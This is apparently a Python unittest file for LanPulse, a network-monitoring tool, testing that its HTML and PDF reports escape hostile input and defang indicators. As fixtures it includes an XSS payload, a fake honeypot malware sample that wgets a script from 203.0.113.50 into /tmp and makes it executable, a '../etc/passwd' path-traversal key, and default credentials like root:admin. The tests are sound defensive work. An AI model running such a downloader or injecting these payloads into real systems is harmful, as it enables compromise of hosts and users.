# SPDX-License-Identifier: GPL-2.0-or-later
# Copyright (C) 2026 The LanPulse authors
"""Reports for every tab: the model, both renderers, and building each kind from the live objects."""
import pathlib
import tempfile
import time
import types
import unittest

import honeyanalysis as ha
import reports


class FakeHp:
    cfg = {}

    def _geo(self, ip):
        return {"iso": "NL", "country": "Netherlands", "city": "Amsterdam", "org": "ExampleNet", "asn": 64500}

    def record(self, *a, **k):
        pass


EVIL = "<script>alert(1)</script>\x00\x1b[31m"


def fake_nm(tmp):
    now = time.time()
    dev = {"id": "d1", "ip": "192.168.0.20", "mac": "aa:bb:cc:dd:ee:ff", "name": EVIL, "vendor": "Acme", "type": "camera", "os": "Linux",
           "online": True, "first_seen": now - 100, "ports": [{"port": 80, "proto": "tcp", "service": "http", "product": "lighttpd"}]}
    finding = {"cve": "CVE-2024-0001", "score": 9.8, "sev": "critical", "desc": "Remote code execution", "port": 80,
               "software": "lighttpd", "kev": True, "msf": [], "edb": False, "distro": False}
    nm = types.SimpleNamespace(
        args=types.SimpleNamespace(demo=False), data_dir=pathlib.Path(tmp), notify_plain=lambda *a: None,
        net={"subnet": "192.168.0.0/24"}, devices={"d1": dev}, auth=types.SimpleNamespace(enabled=True),
        snapshot=lambda: {"devices": [dev]},
        threats=types.SimpleNamespace(summary=lambda h: {
            "total": 120, "unique": 10, "blocked": 100, "countries_n": 2, "countries": [{"iso": "CN", "country": "China", "count": 90}],
            "ports": [{"port": 22, "service": "ssh", "count": 70}], "targets": [{"lan": "192.168.0.20", "count": 5, "allowed": 2, "name": "cam", "type": "camera"}],
            "attackers": [{"ip": "203.0.113.9", "count": 50, "country": "China", "city": "X", "services": ["ssh"], "tag": {"label": "scanner"}}],
            "signatures": [{"name": "ET SCAN", "count": 4, "ips": 2}]}),
        local=types.SimpleNamespace(summary=lambda h: {"events": [{"t": now, "src": "192.168.0.99", "kind": "arp", "severity": "high", "target": "gw", "detail": EVIL}]}),
        dns=types.SimpleNamespace(summary=lambda h, d: {"enabled": True, "total": 1000, "blocked": 200, "domains": 50,
            "top": [{"domain": "example.com", "count": 9, "clients": 1, "bad": False}], "top_blocked": [], "clients": [],
            "malware": [{"ip": "192.168.0.20", "name": "cam", "domain": "bad.example", "count": 3, "last": now}]}),
        vulns=types.SimpleNamespace(results={"d1": [finding]}, summary=lambda: {"totals": {"cves": 1, "kev": 1, "critical": 1, "exploits": 0, "devices": 1, "scanned": 1},
            "fix": [{"name": "cam", "ip": "192.168.0.20", "software": "lighttpd", "port": 80, "count": 1, "max": 9.8, "kev": 1, "top": finding}],
            "devices": [{"name": "cam", "ip": "192.168.0.20", "type": "camera", "count": 1, "critical": 1, "high": 0, "kev": 1, "exploits": 0, "confirmed": 0}], "config": []}),
        services=types.SimpleNamespace(summary=lambda: {"checks": [{"name": "Web", "type": "http", "target": "http://x", "port": 80, "up": False, "up24": 99.5, "up7": 99.9,
            "avg_ms": 12.3, "err": "timeout", "incidents": [{"down": now - 60, "up": None, "err": "timeout"}]}], "up": 0, "down": 1, "total": 1},
            suggestions=lambda: []),
        honeypot=types.SimpleNamespace(summary=lambda h: {"totals": {"hits": 40, "attackers": 3, "internal": 1, "external": 39, "creds": 5},
            "by_service": [{"service": "telnet", "label": "Telnet", "count": 30}], "countries": [{"iso": "RU", "country": "Russia", "hits": 20, "ips": 2}],
            "attackers": [{"ip": "192.168.0.50", "hits": 3, "internal": True, "services": ["telnet"], "first": now - 50, "last": now}],
            "creds": [{"cred": "root:admin", "count": 4}], "usernames": [{"v": "root", "count": 9}], "passwords": [{"v": "admin", "count": 5}],
            "recent": [{"t": now, "ip": "203.0.113.9", "service": "telnet", "port": 23, "internal": False, "creds": "root:admin", "data": ""}]}),
    )
    nm.honeyan = ha.HoneyAnalysis(nm, FakeHp())
    return nm


class Model(unittest.TestCase):
    def test_hostile_text_is_escaped_and_control_characters_dropped(self):
        d = reports.Doc("T" + EVIL, "s").kpi("k", EVIL).h(EVIL).p(EVIL).table(["a"], [[EVIL]])
        out = reports.render_html(d, {"generated": "now", "version": "1", "network": "n"})
        self.assertNotIn("<script>alert", out)
        self.assertNotIn("\x00", out)
        self.assertIn("&lt;script&gt;", out)

    def test_long_tables_are_cut_and_say_so(self):
        d = reports.Doc("T").table(["a"], [[str(i)] for i in range(reports.MAX_ROWS + 25)])
        out = reports.render_html(d, {})
        self.assertIn("25 more are in LanPulse", out)

    def test_empty_table_prints_a_sentence_not_an_empty_grid(self):
        out = reports.render_html(reports.Doc("T").table(["a"], [], empty="Nothing here."), {})
        self.assertIn("Nothing here.", out)
        self.assertNotIn("<table", out)

    @unittest.skipUnless(reports.pdf_available(), "reportlab is optional")
    def test_pdf_is_made_even_for_text_the_builtin_fonts_cannot_draw(self):
        d = reports.Doc("Report <b>", "sub").kpi("a", "1").h("Heading").p("日本語 & <tags>").table(["c1", "c2"], [["x" * 400, "y"]]).bullets(["one"]).kv([("k", "v")])
        data = reports.render_pdf(d, {"generated": "now", "version": "1", "network": "n"})
        self.assertTrue(data.startswith(b"%PDF"))
        self.assertGreater(len(data), 1500)


class EveryKind(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.nm = fake_nm(self.tmp.name)
        ok, self.sha = self.nm.honeyan.add_sample(
            b"#!/bin/sh\nwget http://203.0.113.50/x.sh -O /tmp/x\nchmod +x /tmp/x\n", {"ip": "203.0.113.9", "url": "http://203.0.113.50/x.sh"}, quiet=True)

    def tearDown(self):
        self.tmp.cleanup()

    def test_each_report_builds_and_renders_in_both_formats(self):
        for kind in reports.KINDS:
            with self.subTest(kind=kind):
                doc = reports.gather(self.nm, kind, 168)
                html_out = reports.render_html(doc, reports.meta_for(self.nm, "9.9.9"))
                self.assertIn("<h1>", html_out)
                self.assertNotIn("<script>alert", html_out)
                if reports.pdf_available():
                    self.assertTrue(reports.render_pdf(doc, reports.meta_for(self.nm, "9.9.9")).startswith(b"%PDF"))

    def test_every_tab_has_a_report(self):
        self.assertEqual({v[1] for v in reports.KINDS.values()}, {"network", "threats", "dns", "vulns", "services", "redteam", "honeypot"})

    def test_malware_report_describes_the_sample_and_defangs_indicators(self):
        out = reports.render_html(reports.gather(self.nm, "honeypot-malware", 168), {})
        self.assertIn(self.sha[:16], out)
        self.assertIn("Why this score", out)
        self.assertNotIn("http://203.0.113.50", out)
        self.assertIn("203[.]0[.]113[.]50", out)

    def test_malware_report_uses_cached_yara_results_without_scanning(self):
        self.nm.honeyan._scan_yara = lambda *a, **k: (_ for _ in ()).throw(AssertionError("report triggered YARA scan"))
        doc = reports.gather(self.nm, "honeypot-malware", 168)
        out = reports.render_html(doc, {})
        self.assertIn("YARA scan status:", out)

    def test_executive_report_flags_what_needs_attention(self):
        out = reports.render_html(reports.gather(self.nm, "executive", 24), {})
        self.assertIn("came from inside the network", out)
        self.assertIn("actively exploited", out)
        self.assertIn("watched service(s) are down", out)

    def test_a_broken_source_leaves_a_gap_not_a_failure(self):
        def boom(*a, **k):
            raise RuntimeError("source down")
        self.nm.local = types.SimpleNamespace(summary=boom)
        out = reports.render_html(reports.gather(self.nm, "threats", 24), {})
        self.assertIn("No local network alerts were recorded.", out)

    def test_unknown_report_is_refused(self):
        with self.assertRaises(KeyError):
            reports.gather(self.nm, "../etc/passwd", 24)


if __name__ == "__main__":
    unittest.main()


class ReadableLabels(unittest.TestCase):
    def test_device_types_read_like_words(self):
        self.assertEqual(reports.type_label("nas"), "NAS")
        self.assertEqual(reports.type_label("raspberrypi"), "Raspberry Pi")
        self.assertEqual(reports.type_label("printer"), "Printer")
        self.assertEqual(reports.type_label(None), "Unknown")
